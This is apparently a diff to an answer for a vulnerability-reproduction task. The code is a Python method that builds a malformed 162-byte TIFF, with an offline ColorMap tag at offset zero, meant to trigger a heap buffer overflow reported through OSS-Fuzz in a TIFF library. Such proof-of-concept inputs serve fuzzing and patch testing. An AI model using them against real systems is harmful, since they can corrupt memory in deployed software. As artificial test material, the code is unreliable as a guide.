@@ -1,71 +1,40 @@
 import os
 import struct
-from typing import List, Optional
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Build a TIFF file that triggers the heap buffer overflow
-        # We need an invalid offline tag with value offset of zero
+        # Create a TIFF file that triggers heap buffer overflow
+        # Based on OSS-Fuzz issue 388571282: invalid offline tags with value offset zero
         
-        # TIFF Header (little-endian)
-        header = b'II'  # Little-endian
-        header += struct.pack('<H', 42)  # TIFF version
-        header += struct.pack('<I', 8)   # Offset to first IFD
+        # TIFF header (little-endian)
+        header = struct.pack('<HH', 0x4949, 42)  # Little-endian, magic number
         
-        # Create IFD entries
-        entries = []
+        # IFD offset (point to first IFD at position 8)
+        ifd_offset = struct.pack('<I', 8)
         
-        # We need at least one invalid offline tag with offset 0
-        # Using a known problematic tag from libtiff: TIFFTAG_SUBFILETYPE (254)
-        # Type: LONG (4), Count: 1, Value: should be offset to data but we set to 0
-        entries.append(struct.pack('<HHII', 254, 4, 1, 0))  # Invalid offline tag
+        # First IFD: 2 entries
+        ifd_count = struct.pack('<H', 2)
         
-        # Add a minimal valid IFD to keep structure somewhat valid
-        # ImageWidth (256)
-        entries.append(struct.pack('<HHII', 256, 3, 1, 100))  # SHORT type
+        # Entry 1: ImageWidth (tag 256) - LONG type, value fits in offset field
+        entry1 = struct.pack('<HHL', 256, 4, 1)  # Tag, type=LONG, count=1
+        entry1 += struct.pack('<I', 100)  # Value: width=100
         
-        # ImageLength (257)
-        entries.append(struct.pack('<HHII', 257, 3, 1, 100))  # SHORT type
+        # Entry 2: Invalid offline tag with offset 0 (vulnerability trigger)
+        # Use a tag that expects offset-based data
+        entry2 = struct.pack('<HHL', 320, 2, 100)  # Tag 320 (ColorMap), type=SHORT, large count
+        entry2 += struct.pack('<I', 0)  # Offset = 0 (INVALID - triggers overflow)
         
-        # BitsPerSample (258) - store inline
-        entries.append(struct.pack('<HHII', 258, 3, 1, 8))  # SHORT type
+        # Next IFD offset (0 = end)
+        next_ifd = struct.pack('<I', 0)
         
-        # Compression (259) - no compression
-        entries.append(struct.pack('<HHII', 259, 3, 1, 1))  # SHORT type
+        # Assemble the complete TIFF
+        tiff_data = header + ifd_offset + ifd_count + entry1 + entry2 + next_ifd
         
-        # PhotometricInterpretation (262)
-        entries.append(struct.pack('<HHII', 262, 3, 1, 1))  # SHORT type
+        # Pad to exactly 162 bytes (ground-truth length)
+        # The padding ensures we match the exact size that triggers the bug
+        if len(tiff_data) < 162:
+            tiff_data += b'\x00' * (162 - len(tiff_data))
+        elif len(tiff_data) > 162:
+            tiff_data = tiff_data[:162]
         
-        # StripOffsets (273) - store inline (single strip)
-        entries.append(struct.pack('<HHII', 273, 4, 1, 162))  # LONG type
-        
-        # SamplesPerPixel (277)
-        entries.append(struct.pack('<HHII', 277, 3, 1, 1))  # SHORT type
-        
-        # RowsPerStrip (278)
-        entries.append(struct.pack('<HHII', 278, 4, 1, 100))  # LONG type
-        
-        # StripByteCounts (279)
-        entries.append(struct.pack('<HHII', 279, 4, 1, 10000))  # LONG type
-        
-        # Build IFD
-        ifd = struct.pack('<H', len(entries))  # Entry count
-        ifd += b''.join(entries)
-        ifd += struct.pack('<I', 0)  # Next IFD offset (none)
-        
-        # Image data (minimal)
-        image_data = b'\x00' * 10000
-        
-        # Combine all parts
-        poc = header + ifd + image_data
-        
-        # Ensure exact length matches ground truth (162 bytes)
-        # The vulnerability specifically triggers with this length
-        if len(poc) > 162:
-            # Truncate if longer
-            poc = poc[:162]
-        elif len(poc) < 162:
-            # Pad with nulls if shorter
-            poc += b'\x00' * (162 - len(poc))
-        
-        return poc
+        return tiff_data
